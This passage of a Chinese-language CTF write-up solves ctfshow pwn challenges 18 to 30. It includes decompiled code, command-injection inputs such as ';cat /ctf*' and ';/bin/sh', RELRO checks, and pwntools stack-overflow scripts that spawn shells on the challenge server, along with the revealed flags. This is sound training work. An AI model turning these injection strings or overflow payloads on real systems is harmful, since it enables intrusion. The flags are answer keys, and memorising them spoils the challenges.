<code>command2</code>。</li></ul><ol start="2"><li><strong>通配符 <code>\*</code> 的作用</strong>：</li></ol><ul><li><code>cat /ctf*</code> 会匹配所有以 <code>/ctf</code> 开头的文件（如 <code>/ctfshow_flag</code>）。</li></ul><ol start="3"><li><strong>输入长度限制（10字节）</strong>：</li></ol><ul><li><code>;cat /ctf*</code>（9字节）和 <code>;/bin/sh</code>（8字节）均满足长度限制。</li></ul><hr><h2 id="19-pwn18"><a href="#19-pwn18" class="headerlink" title="19 pwn18"></a>19 pwn18</h2><p>🚩flag：<code>ctfshow{02c7e220-25e0-45bf-a1e1-5f58604d9cc9}</code></p><p>💡hint：<code>二进制文件基础</code> <code>Linux基础命令的拼接</code> <code>逆向分析</code></p><p>仔细看看源码，或许有惊喜</p><p>假作真时真亦假，真作假时假亦真</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B10);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CB0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D38);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DD0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : Do you know redirect output ?                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which is the real flag?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">9</span> )</span><br><span class="line">    fake();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    real();</span><br><span class="line">  system(<span class="string">"cat /ctfshow_flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>假作真时真亦假，输入9是假，那么就是真flag。</p><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.01.39.png" alt="截屏2025-08-11 19.01.39" style="zoom:50%;"><hr><h2 id="20-pwn19"><a href="#20-pwn19" class="headerlink" title="20 pwn19"></a>20 pwn19</h2><p>🚩flag：<code>ctfshow{37005897-483d-4287-aff4-8f5ab17ba35a}</code></p><p>💡hint：<code>二进制文件基础</code>  <code>逆向分析</code></p><p>关闭了输出流，一定是最安全的吗？</p><p>打开环境前先分析反编译源码：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_BF0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C70);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E18);</span><br><span class="line">  <span class="built_in">puts</span>(asc_EB0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : Turn off output, how to get flag? "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fork() )</span><br><span class="line">  {</span><br><span class="line">    wait(<span class="number">0LL</span>);</span><br><span class="line">    sleep(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag is not here!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"give you a shell! now you need to get flag!"</span>);</span><br><span class="line">    fclose(_bss_start);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">    system(buf);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以使用了 exec 函数来执行 sh命令，并使用 1&gt;&amp;0来进行输出重定向。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p><p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh命令后，进入一个交互式的Shell环境， 可以在该环境中执行命令并与用户进行交互。</p><p>也可以直接exec cat /ctf* 1&gt;&amp;0 将 cat /ctf*命令的输出发送到标准输入，实际上就是将命令的输 出再次输出到屏幕上。</p><hr><h2 id="21-pwn20"><a href="#21-pwn20" class="headerlink" title="21 pwn20"></a>21 pwn20</h2><p>🚩flag：<code>ctfshow{1_1_0x600f18_0x600f28}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p><p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p><p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p><p>若某个表不存在，则无需写其对应地址</p><p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p><blockquote><p>RELRO（Relocation Read-Only）是一种ELF二进制保护机制，用于防止攻击者篡改动态链接过程中的关键内存区域（如GOT表）。它分为三种模式：</p><ol><li><strong>No RELRO</strong>：GOT/PLT完全可写，极易被攻击；</li><li><strong>Partial RELRO</strong>：GOT部分只读（延迟绑定仍可写），中等防护；</li><li><strong>Full RELRO</strong>：启动时立即解析所有符号并完全锁定GOT为只读，提供最强保护但会略微增加启动时间。<br>使用<code>checksec</code>可查看保护状态，安全场景建议开启Full RELRO（编译选项：<code>-Wl,-z,relro -Wl,-z,now</code>）。</li></ol></blockquote><p>先checksec一下：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 19.16.53](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.16.53.png)</p><p>没有RELRO保护，故.got和.got.plt都存在。</p><p>查看表的地址：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.44.14.png" alt="截屏2025-08-11 19.44.14" style="zoom:50%;"><p>故：ctfshow{1_1_0x600f18_0x600f28}</p><hr><h2 id="22-pwn21"><a href="#22-pwn21" class="headerlink" title="22 pwn21"></a>22 pwn21</h2><p>🚩flag：<code>ctfshow{0_1_0x600ff0_0x601000}</code></p><p>💡hint：<code>Linux安全机制</code></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>部分防护。</p><p>![截屏2025-08-11 19.47.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.47.08.png)</p><p>查看表的地址：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 19.47.53](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.47.53.png)</p><p>ctfshow{0_1_0x600ff0_0x601000}</p><hr><h2 id="23-pwn22"><a href="#23-pwn22" class="headerlink" title="23 pwn22"></a>23 pwn22</h2><p>🚩flag：<code>ctfshow{0_0_0x600fc0}</code></p><p>💡hint：<code>Linux安全机制</code></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 19.49.19](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.49.19.png)</p><p><strong>Full RELRO</strong>：启动时立即解析所有符号并完全锁定GOT为只读，提供最强保护但会略微增加启动时间。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.51.24.png" alt="截屏2025-08-11 19.51.24" style="zoom:50%;"><p>在写.got表的时候就会抛出异常，而.got.plt不存在 故flag:ctfshow{0_0_0x600fc0}</p><hr><h2 id="24-pwn23"><a href="#24-pwn23" class="headerlink" title="24 pwn23"></a>24 pwn23</h2><p>🚩flag：<code>ctfshow{d9d1e78b-1dab-44d8-a705-6c8346051804}</code></p><p>💡hint：<code>缓冲区溢出漏洞</code></p><p>用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">ssh ctfshow@题目地址 -p题目端口号</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-8h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3, v5, v6, v7, v3);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048940);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A30);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ABC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B4C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BD0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C64);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : No canary found                                         "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How to input ?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">1</span> )</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li><p>首先，程序尝试打开名为”/ctfshow_flag”的文件，并将文件指针赋值给 stream变量。如果打开文件失败（文件不存在或无法访问），程序输出错误消息并终止。</p></li><li><p>如果成功打开文件，程序使用 fgets 函数从文件中读取最多64个字符到名为 flag 的缓冲区。</p></li><li><p>程序输出提示消息： “How to input?”。</p></li><li><p>如果程序运行时传入了命令行参数（ argc大于1），则调用 ctfshow 函数，并将第一个命令 行参数作为参数传递给该函数。</p></li><li><p>ctfshow 函数很简单，它接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名 为 dest 的缓冲区中。然后，它返回指向 dest缓冲区的指针。</p></li></ol><p>这里仅仅是为了演示当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞。</p><p>![截屏2025-08-11 20.03.33](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.03.33.png)</p><hr><blockquote><p>25~29 为栈溢出</p></blockquote><h2 id="25-pwn35"><a href="#25-pwn35" class="headerlink" title="25 pwn35"></a>25 pwn35</h2><p>🚩flag：<code>ctfshow{d5502ece-4e3a-45ec-9e5c-2c7f9ca78a09}</code></p><p>💡hint：<code>栈溢出</code></p><p>正式开始栈溢出了，先来一个最最最最简单的吧</p><p>ctfshow{d5502ece-4e3a-45ec-9e5c-2c7f9ca78a09}</p><p>![截屏2025-08-11 20.11.02](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.11.02.png)</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.12.43](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.12.43.png)</p><p>32位程序开启NX，部分开启RELRO 32位</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+0h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048910);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048984);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A8C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B1C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BA0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Stack_Overflow                                          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : See what the program does!                              "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Where is flag?\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"QaQ!FLAG IS NOT HERE! Here is your input : %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>打开”/ctfshow_flag” 文件，读取其中的内容，并根据命令行参数决定打印不同的消息。如果命令行 参数个数小于等于 1 ，则提示用户重试，否则调用  ctfshow 函数处理用户输入的命令行参数，并输出相关消息。</p><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>char dest:  声明一个名为 dest 的字符变量。 return strcpy(&amp;dest, src): 使用 strcpy 函 数将 src 字符串复制到 dest 字符数组中，并返回指向 dest 的指针。 strcpy函数这个函数是一个典 型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。</p><p>注意到signal(11, (__sighandler_t)sigsegv_handler);函数</p><p>当发生 对存储的无效访问时,会把stderr打印输出,即将flag的值打印输出</p><p>那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag</p><hr><h2 id="26-pwn36"><a href="#26-pwn36" class="headerlink" title="26 pwn36"></a>26 pwn36</h2><p>🚩flag：<code>ctfshow{8197d563-2f34-41d7-94b0-a2ae5fe8d0f0}</code></p><p>💡hint：<code>栈溢出</code></p><p>存在后门函数，如何利用？</p><p>先来checksec</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.17.29](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.17.29.png)</p><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>ida查看main函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Stack_Overflow                                          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : There are backdoor functions here!                      "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Find and use it!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter what you want: "</span>);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>使用  gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出 s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28187</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">flag = elf.sym[<span class="string">'get_flag'</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">4</span>) + p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>运行脚本即可得到flag。</p><hr><h2 id="27-pwn37"><a href="#27-pwn37" class="headerlink" title="27 pwn37"></a>27 pwn37</h2><p>🚩flag：<code>ctfshow{00b37148-e0b5-422c-9a92-0fbe1310dc78}</code></p><p>💡hint：<code>栈溢出</code></p><p>32位的 system(“/bin/sh”) 后门函数给你</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别和架构</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择本地调试或远程连接（二选一）</span></span><br><span class="line"><span class="comment"># io = process('./pwn')  # 本地调试</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28228</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">backdoor_addr = elf.sym[<span class="string">'backdoor'</span>]  <span class="comment"># 获取backdoor函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload：填充偏移 + 返回地址</span></span><br><span class="line">offset = <span class="number">0x12</span> + <span class="number">4</span>  <span class="comment"># 假设偏移量是0x12 + 4（覆盖返回地址）</span></span><br><span class="line">payload = <span class="string">b'A'</span> * offset + p32(backdoor_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>溢出覆盖返回地址再输入后门函数地址即可控制程序的执行流程</p><hr><h2 id="28-pwn38"><a href="#28-pwn38" class="headerlink" title="28 pwn38"></a>28 pwn38</h2><p>🚩flag：<code>ctfshow{3fc5ea88-fa41-45c3-b57c-861618063a48}</code></p><p>💡hint：<code>栈溢出</code></p><p>64位的 system(“/bin/sh”) 后门函数给你</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28270</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x40065B</span>) + p64(<span class="number">0x400657</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>思路和上一个题目类似。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> ctfshow_flag</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.49.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.49.48.png)</p><hr><h2 id="29-pwn39"><a href="#29-pwn39" class="headerlink" title="29 pwn39"></a>29 pwn39</h2><p>🚩flag：<code>ctfshow{4a15a146-0370-4287-b0b1-a047a5779ae1}</code></p><p>💡hint：<code>栈溢出</code></p><p>32位的 system(); “/bin/sh”</p><p>漏洞函数ctfshow()。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28309</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(<span class="number">0x80483A0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x8048750</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.56.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.56.31.png)</p><hr><blockquote><p>30~33为格式化字符</p></blockquote><h2 id="30-pwn91"><a href="#30-pwn91" class="headerlink" title="30 pwn91"></a>30 pwn91</h2><p>🚩flag：<code>ctfshow{2d4ff392-5150-475d-a7c1-443e845a4b4d}</code></p><p>💡hint：<code>格式化字符串</code></p><p>开始格式化字符串了，先来个简单的吧</p><p>![截屏2025-08-11 21.17.10](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 21.17.10.png)</p><p>32位关闭PIE，部分开启RELRO</p><p>ida查看main函数</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">if</span> ( daniu == <span class="number">6</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"daniu praise you for a good job!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到当daniu = 6 的时候即可获的一个shell</p><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> 